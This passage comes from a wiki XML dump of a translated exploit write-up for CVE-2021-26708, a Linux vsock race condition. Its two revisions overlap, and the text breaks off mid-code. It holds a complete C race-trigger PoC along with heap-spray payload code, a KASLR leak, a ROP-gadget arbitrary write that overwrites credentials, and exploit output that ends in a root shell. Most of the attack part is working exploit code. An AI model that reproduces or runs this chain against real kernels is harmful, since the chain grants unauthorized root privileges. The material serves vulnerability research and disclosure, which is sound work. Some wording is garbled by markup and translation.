    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

The front is the message header, and the back is the message data. If the struct msgbuf in the user space has a 16-byte mtext, the corresponding msg_msg will be created in the kmalloc-64 block cache. A 4-byte write-after-free will destroy the void *security pointer at offset 40. The msg_msg.security field points to the kernel data allocated by lsm_msg_msg_alloc(). When msg_msg is received, it will be released by security_msg_msg_free(). Therefore, by destroying the first half of the security pointer, arbitrary free can be obtained.

==Kernel Information Leak==

Here is used [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D %87%E6%BC%8F%E6%B4%9E CVE-2019-18683] the same technique. The second connect() of the virtual socket calls &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; and sets &lt;code&gt;vsk-&gt;transport&lt;/code&gt; to NULL, making &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; Calling &lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt; after the memory crash, a kernel warning appears:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
Through gdb debugging, it is found that the RCX register contains the kernel address of the released virtio_vsock_sock, and the RBX register contains the kernel address of vsock_sock.

==Achieve arbitrary reading==

===From arbitrary free to use-after-free===

Release an object from the leaked kernel address
Perform heap spray and cover the object with controlled data
Use damaged objects for privilege escalation
The System V message implemented by the kernel has a maximum limit of DATALEN_MSG, that is, PAGE_SIZE minus sizeof(struct msg_msg)). If you send a larger message, the remaining messages will be saved in the list of message segments. The msg_msg contains struct msg_msgseg *next to point to the first segment, and size_t m_ts is used to store the size. When performing an overwrite operation, you can put the controlled value in msg_msg.m_ts and msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
But how to use msg_msg to read kernel data? By reading the msgrcv() system call documentation, I found a good solution, using msgrcv() and MSG flags:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
This flag causes the kernel to copy the message data to the user space without deleting it from the message queue. If the kernel has CONFIG_CHECKPOINT_RESTORE=y, then MSG is available and applicable in Fedora Server.

===Steps of arbitrary reading===

Ready to work:
Use sched_getaffinity() and CPU_COUNT() to calculate the number of available CPUs (at least two are required for this vulnerability);
Open /dev/kmsg for analysis;
mmap() configures userfaultfd() in the spray_data memory area as the last part;
Start a separate pthread to handle userfaultfd() events;
Start 127 threads for setxattr()&amp;userfaultfd() heap spray on msg_msg, and hang them on thread_barrier;
Get the kernel address of the original msg_msg:
Conditional competition on virtual sockets;
After the second connect(), wait 35 microseconds in the busy loop;
Call msgsnd() to create a separate message queue; after memory corruption, the msg_msg object is placed in the virtio_vsock_sock position;
Parse the kernel log and save the kernel address of msg_msg from the kernel warning (RCX register);
At the same time, save the kernel address of vsock_sock from the RBX register;
Use the damaged msg_msg to perform arbitrary release of the original msg_msg:
Use 4 bytes of the original msg_msg address as SO_VM_SOCKETS_BUFFER_SIZE to achieve memory corruption;
Conditional competition on virtual sockets;
Call msgsnd() immediately after the second connect(); msg_msg is placed in the position of virtio_vsock_sock to achieve destruction;
The security pointer of the now destroyed msg_msg stores the address of the original msg_msg (from step 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

If the msg_msg.security memory corruption from the setsockopt() thread occurs during the processing of msgsnd(), the SELinux permission check fails;
In this case, msgsnd() returns -1, and the damaged msg_msg is destroyed; releasing msg_msg.security can release the original msg_msg;
Overwrite the original msg_msg with a controllable payload:
After msgsnd() fails, the vulnerability will call pthread_barrier_wait() and call 127 pthreads for heap spraying;
These pthreads execute the payload of setxattr();
The original msg_msg is overwritten by controllable data, and the msg_msg.next pointer stores the address of the vsock_sock object;

[[File:T0140baae964febb059.png | 600px ]]

Read the contents of the vsock_sock kernel object to user space by receiving messages from the message queue storing the overwritten msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

==Find the target of attack==

Here are the points I found:
1. Dedicated block cache, such as PINGv6 and sock_inode_cache have many pointers to objects
2. The struct mem_cgroup *sk_memcg pointer is at offset 664 in vsock_sock.sk. The mem_cgroup structure is allocated in kmalloc-4k block cache.
3. The const struct cred *owner pointer is at offset 840 of vsock_sock.sk, and stores the address of the credential that can be overwritten for permission escalation.
4. The void (*sk_write_space)(struct sock *) function pointer is at offset 688 of vsock_sock.sk and is set to the address of the sock_def_write_space() kernel function. It can be used to calculate the KASLR offset.

Here is how the vulnerability extracts these pointers from memory:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

==Implement Use-after-free on sk_buff==

The network-related buffer in the Linux kernel is represented by struct sk_buff. There are skb_shared_info and destructor_arg in this object, which can be used for control flow hijacking. Network data and skb_shared_info are placed in the same kernel memory block pointed to by sk_buff.head. Therefore, creating a 2800-byte network packet in user space will cause skb_shared_info to be allocated to the kmalloc-4k block cache, as is the mem_cgroup object.

I built the following steps:

1. Use sockets (AF_INET, SOCK_DGRAM, IPPROTO_UDP) to create a client socket and 32 server sockets

2. Prepare a 2800-byte buffer in user space and use 0x42 to memset()

3. Use sendto() to send this buffer from the client socket to each server socket, which is used to create the sk_buff object in kmalloc-4k. Use `sched_setaffinity() on every available CPU

4. Perform arbitrary reading process on vsock_sock

5. Calculate the possible sk_buff kernel address as sk_memcg plus 4096 (the next element of kmalloc-4k)

6. Perform arbitrary reads on this possible sk_buff address

7. If you find 0x42424242424242lu in the location of the network data, find the real sk_buff, and go to step 8. Otherwise, add 4096 to the possible sk_buff address and go to step 6

8. Execute the setxattr()&amp;userfaultfd() heap spray of 32 pthreads on sk_buff and hang them on pthread_barrier

9. Arbitrarily release the sk_buff kernel address

10. Call pthread_barrier_wait(), execute 32 setxattr() to cover the heap spray pthreads of skb_shared_info

11. Use recv() to receive network messages from the server socket.

==Writing freely through skb_shared_info==

The following is a valid payload that overwrites the sk_buff object:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info resides in the injection data, exactly at the offset SKB_SHINFO_OFFSET, which is 3776 bytes. The skb_shared_info.destructor_arg pointer stores the address of struct ubuf_info. Because the kernel address of the attacked sk_buff is known, a fake ubuf_info can be created at MY_UINFO_OFFSET in the network buffer. The following is the layout of a valid payload:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Let's talk about the destructor_arg callback:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Since I couldn't find a gadget that can meet my needs in vmlinuz-5.10.11-200.fc33.x86_64, I researched and constructed it myself.

The callback function pointer stores the address of a ROP gadget, RDI stores the first parameter of the callback function, which is the address of ubuf_info itself, and RDI + 8 points to ubuf_info.desc. gadget moves ubuf_info.desc to RDX. Now RDX contains the effective user ID and group ID address minus one byte. This byte is very important: when the gadget writes message 1 from RSI to the memory pointed to by RDX, the effective uid and gid will be overwritten with zero. Repeat the same process until the privileges are upgraded to root. The output flow of the whole process is as follows:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

==Video==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


==Reference==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>sfmbuzt0gf8vdyflkpo8iad4xa0vvo6</sha1>
    </revision>
    <revision>
      <id>2214</id>
      <parentid>2213</parentid>
      <timestamp>2021-05-04T04:37:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Reference=="</comment>
      <origin>2214</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="25553" sha1="3mahtwt0gpgjtemz0hdqw2jqhfqfrvd" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability==

These vulnerabilities are race conditions caused by incorrect locking in &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. These conditional competitions were implicitly introduced in the submission that added VSOCK multi-transport support in November 2019, and were merged into the Linux kernel 5.5-rc1 version.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; and &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; are provided as kernel modules in all major GNU/Linux distributions. When you create a socket for the AF_VSOCK domain, these vulnerable modules are automatically loaded.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

The creation of &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets is available to non-privileged users and does not require user name space.


==Memory corruption==

The following is a detailed introduction to the use of CVE-2021-26708, using the conditional competition in &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;. Two threads are required to reproduce. The first thread calls &lt;code&gt;setsockopt()&lt;/code&gt; :
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



The second thread changes the virtual socket transmission when &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt; tries to acquire the socket lock, by reconnecting the virtual socket:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


In order to process the &lt;code&gt;connect()&lt;/code&gt; of the virtual socket, the kernel executes &lt;code&gt;vsock_stream_connect()&lt;/code&gt; which calls &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function contains the following code:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt; contains a socket lock, and &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; in the parallel thread also tries to obtain it, which constitutes a conditional competition. Therefore, when the second &lt;code&gt;connect()&lt;/code&gt; is performed with a different &lt;code&gt;svm_cid&lt;/code&gt;, the &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; function is called. This function executes &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, releases &lt;code&gt;vsock_sock.trans&lt;/code&gt;, and &lt;code&gt;vsk-&gt;transport&lt;/code&gt; is set to NULL. When &lt;code&gt;vsock_stream_connect()&lt;/code&gt; releases the socket lock, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; can continue to execute. It calls &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, and then calls &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Here transport contains an outdated value from a local variable, which does not match &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (the original value is set to NULL).

When the kernel executes &lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;, memory corruption occurs:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;div class="mw-translate-fuzzy"&gt;
Here, vvs is a pointer to the kernel memory, which has been released in &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. The size of &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt; is 64 bytes and is located in the kmalloc-64 block cache. The buf_alloc field type is u32 and is located at offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt;. The value of *val is controlled by the attacker, and its four least important bytes are written into the freed memory.
&lt;/div&gt;


==Fuzzing==

The syzkaller fuzzer has no way to reproduce this crash, so I decided to study it myself. But why does the fuzzer fail? Observe &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt; and find out:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Only when val is different from the current buffer_size, will &lt;code&gt;notify_buffer_size()&lt;/code&gt; be called, that is to say, when &lt;code&gt;setsockopt()&lt;/code&gt; executes &lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;, every time The size parameters of the call should all be different. So I built the relevant code:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

The size value here is taken from the number of nanoseconds returned by &lt;code&gt;clock_gettime()&lt;/code&gt;, which may be different each time. The original syzkaller will not do this, because when syzkaller generates fuzzing input, the value of the syscall parameter is determined and will not change during execution.

== The power of four bytes ==

Here I choose Fedora 33 Server as the research target, the kernel version is 5.10.11-200.fc33.x86_64, and I am determined to bypass SMEP and SMAP.

In the first step, I started to study stable heap spraying, which exploited the execution of user space activities to cause the kernel to allocate another 64-byte object at the location of the released virtio_vsock_sock. After several experimental attempts, it was confirmed that the released virtio_vsock_sock was overwritten, indicating that heap spraying is feasible. Finally I found msgsnd() syscall. It creates struct msg_msg in the kernel space, see pahole output:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

The front is the message header, and the back is the message data. If the struct msgbuf in the user space has a 16-byte mtext, the corresponding msg_msg will be created in the kmalloc-64 block cache. A 4-byte write-after-free will destroy the void *security pointer at offset 40. The msg_msg.security field points to the kernel data allocated by lsm_msg_msg_alloc(). When msg_msg is received, it will be released by security_msg_msg_free(). Therefore, by destroying the first half of the security pointer, arbitrary free can be obtained.

==Kernel Information Leak==

Here is used [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D %87%E6%BC%8F%E6%B4%9E CVE-2019-18683] the same technique. The second connect() of the virtual socket calls &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; and sets &lt;code&gt;vsk-&gt;transport&lt;/code&gt; to NULL, making &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; Calling &lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt; after the memory crash, a kernel warning appears:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
Through gdb debugging, it is found that the RCX register contains the kernel address of the released virtio_vsock_sock, and the RBX register contains the kernel address of vsock_sock.

==Achieve arbitrary reading==

===From arbitrary free to use-after-free===

Release an object from the leaked kernel address
Perform heap spray and cover the object with controlled data
Use damaged objects for privilege escalation
The System V message implemented by the kernel has a maximum limit of DATALEN_MSG, that is, PAGE_SIZE minus sizeof(struct msg_msg)). If you send a larger message, the remaining messages will be saved in the list of message segments. The msg_msg contains struct msg_msgseg *next to point to the first segment, and size_t m_ts is used to store the size. When performing an overwrite operation, you can put the controlled value in msg_msg.m_ts and msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
